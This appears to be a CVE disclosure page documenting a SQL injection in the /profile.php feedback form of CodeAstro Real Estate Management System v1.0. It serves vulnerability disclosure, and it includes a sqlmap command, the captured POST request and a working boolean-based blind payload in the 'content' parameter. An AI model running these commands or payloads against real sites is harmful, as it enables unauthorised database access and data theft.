# CVE-2025-5582

SQLi vulnerability in CodeAstro Real Estate Management System v1.0 of file /profile.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /profile.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
POST /profile.php HTTP/1.1
Host: www.realestate.com
Origin: http://www.realestate.com
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=d4bb5bt4089bi920s8gj8fb0np
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
Referer: http://www.realestate.com/profile.php
Content-Length: 61

name=test&phone=1888888888&content=11111&insert=Send+Feedback
```

```bash
sqlmap -r request.txt --level 5
```

```
---
Parameter: content (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: name=test&phone=1888888888&content=11111' RLIKE (SELECT (CASE WHEN (9874=9874) THEN 11111 ELSE 0x28 END)) AND 'tydV'='tydV&insert=Send Feedback
---
```





![image-20250602121253240](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506021212402.png)